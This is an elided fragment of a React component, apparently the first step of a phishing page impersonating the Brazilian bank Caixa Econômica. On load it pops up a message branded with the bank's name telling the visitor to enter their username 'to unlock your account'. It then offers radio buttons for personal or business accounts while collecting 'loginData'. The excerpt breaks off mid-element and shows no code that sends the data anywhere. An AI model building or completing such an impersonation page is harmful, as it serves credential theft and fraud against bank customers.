...
const Step1 = ({ nextStep, loginData, setLoginData }) => {
    ...
    useEffect(() => {
        alertify.alert('Caixa Econômica', 'Para desbloquear sua conta digite seu Usuario!')
    }, [])
    ...
    return loading
        ...
        <div>
            ...
            <div>
                ...
                <Radio
                    checked={estadosRadio === 'fisica'}
                    onChange={handleChange}
                    value="fisica"
                    name="radio-button-demo"
                    inputProps={{ 'aria-label': 'FISICA' }}
                /><label>Pessoa Fisica</label>
                <Radio
                    checked={estadosRadio === 'juridica'}
                    onChange={handleChange}
                    value="juridica"
                    name="radio-button-demo"
                    inputProps={{ 'aria-label': 'JURIDICA' }}
